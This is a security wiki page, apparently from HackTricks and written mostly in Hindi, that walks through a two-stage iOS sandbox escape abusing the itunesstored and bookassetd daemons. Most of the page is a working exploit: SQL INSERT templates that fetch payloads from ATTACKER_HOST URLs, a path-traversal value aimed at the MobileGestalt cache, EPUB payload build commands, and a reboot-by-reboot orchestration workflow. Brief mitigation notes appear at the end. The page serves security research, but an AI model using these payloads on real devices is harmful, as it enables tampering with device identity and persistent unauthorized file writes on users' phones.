# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

हालिया शोध दर्शाता है कि दो प्री-इंस्टॉल iOS डेमन्स, **`itunesstored`** (downloads manager) और **`bookassetd`** (Books / iBooks asset manager), user-writable SQLite metadata पर अंधाधुंध भरोसा करते हैं। कस्टम `downloads.28.sqlitedb` और `BLDatabaseManager.sqlite` फाइलें तथा एक न्यूनतम EPUB आर्काइव रखकर, कोई भी हमला करने वाला जो `/var/mobile/Media/` के अन्दर लिख सकता है, इन डेमन्स को मजबूर कर सकता है कि वे **/private/var/ के भीतर अधिकांश `mobile`-owned पाथ्स पर मनमाने फाइल लिखें**। ये primitives reboots के बाद भी बच जाते हैं और आपको system group caches जैसे `systemgroup.com.apple.mobilegestaltcache` को छेड़छाड़ करने की अनुमति देते हैं ताकि डिवाइस गुणों को spoof किया जा सके या configuration को persist किया जा सके।

मुख्य विशेषताएँ:

- Works on devices up to at least **iOS 26.2b1** (tested on iPhone 12 / iOS 26.0.1).
- Writable targets include `SystemGroup` caches, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media`, and other `mobile` owned files. Writes to `root`-owned files fail.
- Needs only AFC-level access (USB file copy) or any foothold that lets you replace the target SQLite DBs and upload payloads.

## खतरे का मॉडल और आवश्यकताएँ

1. **Local filesystem access** to `/var/mobile/Media/Downloads/` and `/var/mobile/Media/Books/` (via AFC clients like 3uTools, i4.cn, or [`afcclient`](https://github.com/emonti/afcclient) over USB, or any prior compromise).
2. **HTTP server** hosting attacker files (`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, crafted EPUB) exposed through URLs such as `https://ATTACKER_HOST/fileprovider.php?type=...`.
3. Ability to **reboot the device multiple times** to make each daemon reload its database.
4. Knowledge of the **Books system-group UUID** so the Stage 1 write lands in the right container (found via syslog).

## Stage 1 – `downloads.28.sqlitedb` का दुरुपयोग `itunesstored` के माध्यम से

`itunesstored` प्रोसेस करता है `/var/mobile/Media/Downloads/downloads.28.sqlitedb`। `asset` तालिका URL + destination metadata संग्रहीत करती है और इसे trusted input माना जाता है। एक ऐसी row बनाकर जो attacker URL पर पॉइंट करे और `local_path` को Books SystemGroup के अंदर `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite` पर सेट करे, `itunesstored` को बूट पर attacker कंटेंट के साथ Books database डाउनलोड और overwrite करने के लिए मजबूर किया जा सकता है।

### Books SystemGroup UUID का पता लगाना

1. [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3) से एक syslog archive इकट्ठा करें:
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. **Console.app** में `logs.logarchive` खोलें और `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite` खोजें।
3. `<UUID>` रिकॉर्ड करें और उसे SQL payload में बदल दें।

### दुर्भावनापूर्ण `asset` row

<details>
<summary>स्टेज 1 INSERT टेम्पलेट</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**महत्वपूर्ण फ़ील्ड:**

- `url`: attacker-controlled endpoint returning the malicious `BLDatabaseManager.sqlite`.
- `local_path`: ऊपर निर्धारित Books system-group `BLDatabaseManager.sqlite` फ़ाइल।
- Control flags: डिफ़ॉल्ट रखें (`asset_type='media'`, `path_extension='epub'`, booleans set to 0/1 as in the template) ताकि daemon टास्क स्वीकार करे।

### तैनाती

1. रेस कंडीशनों से बचने के लिए पुराने `/var/mobile/Media/Downloads/*` एंट्रीज़ हटाएँ।
2. AFC के माध्यम से `downloads.28.sqlitedb` को तैयार किए गए DB से बदलें।
3. रीबूट → `itunesstored` Stage 2 डेटाबेस डाउनलोड करता है और `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist` को ड्रॉप करता है।
4. उस plist को `/var/mobile/Media/Books/iTunesMetadata.plist` पर कॉपी करें; Stage 2 इसे वहीं अपेक्षित करता है।

## Stage 2 – `BLDatabaseManager.sqlite` का दुरुपयोग `bookassetd` के माध्यम से

`bookassetd` के पास विस्तृत filesystem entitlements हैं और यह `ZBLDOWNLOADINFO` टेबल पर भरोसा करता है। आक्रमणकर्ता-URLs और `ZPLISTPATH` में traversal का संदर्भ देने वाली एक नकली purchase row डालकर, daemon आपके EPUB को `/var/mobile/Media/Books/asset.epub` पर डाउनलोड कर देता है और बाद में metadata को **किसी भी `mobile`-owned path में अनपैक कर देता है जो `../../..` escape sequences के माध्यम से पहुँच योग्य हो**।

### Malicious `ZBLDOWNLOADINFO` row

<details>
<summary>Stage 2 INSERT टेम्पलेट</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

महत्वपूर्ण फ़ील्ड:

- `ZASSETPATH`: डिस्क पर स्थित EPUB स्थान जो अटैकर द्वारा नियंत्रित होता है।
- `ZURL`/`ZPERMLINK`: EPUB और सहायक plist होस्ट करने वाले attacker URLs।
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – EPUB से निकाले गए फाइलों के साथ append किया गया **path traversal base**। इच्छित SystemGroup target तक पहुँचने के लिए traversal depth समायोजित करें।
- Purchase metadata (`ZSTOREIDENTIFIER`, names, timestamps`) वैध प्रविष्टियों की नकल करते हैं ताकि daemon उस पंक्ति को न हटाए।

Stage 1 के ज़रिये malicious DB को `/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite` में कॉपी करने और डिवाइस को दो बार reboot करने के बाद, `bookassetd` (1) EPUB को download करेगा, (2) उसे process करेगा और derived plist को traversed path के अंतर्गत लिखेगा।

## EPUB Payload तैयार करना

`bookassetd` EPUB ZIP फ़ॉर्मेट का सम्मान करता है: `mimetype` पहला अनकंप्रेस्ड एंट्री होना चाहिए। EPUB की सामग्री को MobileGestalt cache में मैप करने के लिए, `ZPLISTPATH` के सापेक्ष इच्छित पथ को mirror करने वाला directory tree बनाएं।
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
आर्काइव बनाएं:
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` आमतौर पर `application/epub+zip` ही होता है।
- `Caches/com.apple.MobileGestalt.plist` में हमलावर-नियंत्रित payload होता है जो `.../Library/Caches/com.apple.MobileGestalt.plist` पर पहुंचेगा।

## ऑर्केस्ट्रेशन वर्कफ़्लो

1. **Prepare files** attacker HTTP server पर रखें और host/UUID-विशिष्ट मानों के साथ दोनों SQLite DBs तैयार करें।
2. **Replace `downloads.28.sqlitedb`** डिवाइस पर बदलें और reboot करें → Stage 1 malicious `BLDatabaseManager.sqlite` डाउनलोड करता है और `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist` उत्पन्न करता है।
3. **Copy `iTunesMetadata.plist`** को `/var/mobile/Media/Books/iTunesMetadata.plist` पर कॉपी करें (यदि daemon इसे हटाता है तो दोहराएँ)।
4. **Reboot again** → `bookassetd` Stage 2 metadata का उपयोग करके `asset.epub` को `/var/mobile/Media/Books/` में डाउनलोड करता है।
5. **Reboot a third time** → `bookassetd` डाउनलोड किए गए asset को प्रोसेस करता है, `ZPLISTPATH` का पालन करता है, और EPUB सामग्री को लक्षित SystemGroup path (उदा., `com.apple.MobileGestalt.plist`) में लिख देता है।
6. **Verify** ओवरराइट किए गए plist को पढ़कर या यह देखकर कि MobileGestalt-derived properties (model identifier, activation flags, आदि) तदनुसार बदल गए हैं।

इसी पैटर्न से आप अन्य `mobile`-owned caches में भी फाइलें गिरा सकते हैं, जैसे FairPlay state या persistence निर्देशिकाएँ, जिससे kernel exploit की आवश्यकता के बिना छिपकर छेड़छाड़ संभव हो जाती है।

## टूलिंग & ऑपरेशनल नोट्स

- **`pymobiledevice3 syslog collect logs.logarchive`** – log archives निकालेँ ताकि Books SystemGroup UUID पता चल सके।
- **Console.app** – `bookassetd [Database]: Store is at ...` के लिए filter करें ताकि सटीक container path मिल सके।
- **AFC clients (`afcclient`, 3uTools, i4.cn)** – बिना jailbreak के USB पर SQLite DBs और plist फाइलें push/pull करें।
- **`zip`** – payloads पैकेज करते समय EPUB ऑर्डरिंग constraints लागू करने के लिए उपयोग करें।
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> बेसलाइन SQLite/EPUB टेम्पलेट्स देता है जिन्हें आप कस्टमाइज़ कर सकते हैं।

## डिटेक्शन & निवारण विचार

- `downloads.28.sqlitedb` और `BLDatabaseManager.sqlite` को untrusted input मानें: सत्यापित करें कि `local_path` / `ZPLISTPATH` अनुमोदित sandboxes के भीतर रहें और fully qualified paths या traversal टोकन को अस्वीकार करें।
- उन AFC writes की निगरानी करें जो इन databases को बदलते हैं या boot के तुरंत बाद `itunesstored` / `bookassetd` द्वारा शुरू किए गए unexpected downloads के लिए।
- `bookassetd` के unpacking को कठोर बनाएं ताकि output target को `realpath()` करके सुनिश्चित किया जा सके कि यह लिखने से पहले Books container से बाहर नहीं निकल सकता।
- AFC / USB file copy चैनलों को सीमित करें या Books/iTunes metadata फाइलों के प्रतिस्थापन की अनुमति देने से पहले user interaction आवश्यक करें।

## संदर्भ

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
